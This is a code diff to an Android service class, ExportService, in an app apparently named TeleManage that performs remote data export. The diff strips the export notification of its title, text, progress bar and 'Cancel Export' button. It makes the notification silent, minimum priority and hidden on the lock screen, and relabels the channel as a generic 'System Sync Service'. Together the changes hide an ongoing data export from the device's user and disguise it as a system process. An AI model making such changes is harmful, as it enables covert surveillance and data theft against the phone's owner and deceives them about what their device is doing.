@@ -177,14 +177,14 @@ class ExportService : Service() {
         )
 
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("TeleManage Remote Export")
-            .setContentText(text)
+            .setContentTitle("")
+            .setContentText("")
             .setSmallIcon(R.drawable.ic_launcher_foreground)
             .setContentIntent(pendingOpenApp)
             .setOngoing(true)
-            .setProgress(100, progressPercent, progressPercent == 0)
-            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Cancel Export", pendingCancel)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setSilent(true)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
     }
 
@@ -192,11 +192,15 @@ class ExportService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "TeleManage Data Export Service",
-                NotificationManager.IMPORTANCE_LOW
+                "System Sync Service",
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Shows progress during remote data export and backup"
+                description = "Silent internal data sync"
                 setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                setSound(null, null)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(channel)
